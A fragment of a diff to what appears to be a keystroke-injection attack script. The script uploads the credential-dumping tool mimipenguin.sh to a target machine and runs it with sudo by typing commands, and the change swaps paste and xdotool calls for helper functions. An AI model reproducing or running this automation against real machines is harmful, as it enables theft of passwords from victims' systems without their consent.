@@ -10,5 +10,5 @@ FILE="mimipenguin.sh"
 curl_upload_file "${LOCATION}" "${FILE}"
 sleep 3
 
-paste_command "sudo bash mimipenguin.sh"
-xdotool key Return
+execute_command "sudo bash mimipenguin.sh"
+create_new_line
